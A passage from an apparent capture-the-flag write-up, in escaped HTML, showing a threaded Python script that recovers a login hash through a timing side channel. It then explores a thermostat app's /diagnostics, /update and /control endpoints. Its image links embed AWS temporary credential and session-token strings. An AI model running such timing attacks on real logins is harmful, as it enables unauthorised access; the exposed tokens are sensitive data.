class=\"n\"\u003eDATA\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n   \u003cspan class=\"s\"\u003e\u0026quot;hash\u0026quot;\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"n\"\u003eHEADERS\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n   \u003cspan class=\"s\"\u003e\u0026quot;Content-Type\u0026quot;\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;application/x-www-form-urlencoded\u0026quot;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eRESULTS\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{}\u003c/span\u003e\n\u003cspan class=\"n\"\u003eCURRENT\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e#CURRENT = b\u0026#39;\\xf9\\x86ZIR\\xa4\\xf5\\xd7KC\\xf3U\\x8f\\xedj\\x02%\\xc6\\x87\\x7f\\xba`\\xa2P\\xbc\\xbd\\xe7S\\xf5\\xdb\\x13\u0026#39;\n\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003etest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eattempt\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n   \u003cspan class=\"n\"\u003ebefore\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n   \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edict\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eDATA\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n   \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;hash\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ebinascii\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ehexlify\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eCURRENT\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003ebytes\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"n\"\u003eattempt\u003c/span\u003e\u003cspan class=\"p\"\u003e]))\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eljust\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e64\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n   \u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eURL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eheaders\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eHEADERS\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n   \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n   \u003cspan class=\"n\"\u003eafter\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\n   \u003cspan class=\"n\"\u003ediff\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eafter\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"n\"\u003ebefore\u003c/span\u003e\n   \u003cspan class=\"n\"\u003eRESULTS\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eattempt\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ediff\u003c/span\u003e\n\n\n\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n   \u003cspan class=\"n\"\u003epossibilities\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0xff\u003c/span\u003e\u003cspan class=\"p\"\u003e)]\u003c/span\u003e\n\n   \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n       \u003cspan class=\"n\"\u003ethreads\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[]\u003c/span\u003e\n       \u003cspan class=\"n\"\u003eRESULTS\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{}\u003c/span\u003e\n\n       \u003cspan class=\"n\"\u003em\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n       \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003eattempt\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003elist\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epossibilities\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n           \u003cspan class=\"n\"\u003ethread\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ethreading\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eThread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003etest\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eattempt\u003c/span\u003e\u003cspan class=\"p\"\u003e,))\u003c/span\u003e\n           \u003cspan class=\"n\"\u003ethread\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estart\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n           \u003cspan class=\"n\"\u003em\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\n           \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003em\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"mi\"\u003e7\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n               \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esleep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mf\"\u003e1.5\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n           \u003cspan class=\"n\"\u003ethreads\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eappend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ethread\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n       \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ethread\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003ethreads\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n           \u003cspan class=\"n\"\u003ethread\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\n       \u003cspan class=\"n\"\u003eTHRESHOLD\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mf\"\u003e0.50\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eCURRENT\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n       \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003eattempt\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003eRESULTS\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n           \u003cspan class=\"n\"\u003et\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eRESULTS\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eattempt\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n           \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eRESULTS\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eattempt\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"n\"\u003eTHRESHOLD\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n               \u003cspan class=\"n\"\u003epossibilities\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eremove\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eattempt\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n       \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epossibilities\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n           \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\n\n       \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epossibilities\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n   \u003cspan class=\"n\"\u003eCURRENT\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eCURRENT\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003ebytes\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"n\"\u003epossibilities\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]])\u003c/span\u003e\n   \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eCURRENT\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe final hash came out to be \u003ccode\u003ef9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eUsing it to login, we are presented with a very simple page:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_204.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/454/015bcbe7434144afe559a369b19f063a31bce110/Selection_204.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_204.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_204.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=a5cff27030729adb50aec50273b7921eb3ea628f6b1e153202f1743f1a9337c6\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/454/015bcbe7434144afe559a369b19f063a31bce110/Selection_204.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_204.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_204.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=a5cff27030729adb50aec50273b7921eb3ea628f6b1e153202f1743f1a9337c6\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIn the HTML source, we also see a commented out \u003ccode\u003e/diagnostics\u003c/code\u003e endpoint\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e        \u0026lt;ul\u0026gt;\n            \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;/control\u0026quot;\u0026gt;Temperature control\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;/update\u0026quot;\u0026gt;Check for updates\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n            \u0026lt;!--\u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;/diagnostics\u0026quot;\u0026gt;Diagnostics\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;--\u0026gt;\n        \u0026lt;/ul\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut it returns \u0026quot;Forbidden\u0026quot; when we try to access it. Later on, we will find out that it was just a red herring and all the time I spent on accessing it was a waste.\u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003e/update\u003c/code\u003e endpoint probably tries to connect to a host and looks for an update manifest file, but it always errors as the host:post used is invalid\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_205.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/469/8eefa704667c57410e834ebc5afaa1f6699f0ea4/Selection_205.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_205.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_205.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=469f612dee294769c6a5062c882384c06ede27d2f53fdc251a40b077b890514d\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/469/8eefa704667c57410e834ebc5afaa1f6699f0ea4/Selection_205.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_205.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_205.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=469f612dee294769c6a5062c882384c06ede27d2f53fdc251a40b077b890514d\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003e/control\u003c/code\u003e endpoint shows us the temperature of the supposed thermostat and allows us to change it too. It didn\u0026#39;t turn out to be useful either except we could have an extremely large/small temperature.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_207.png\" 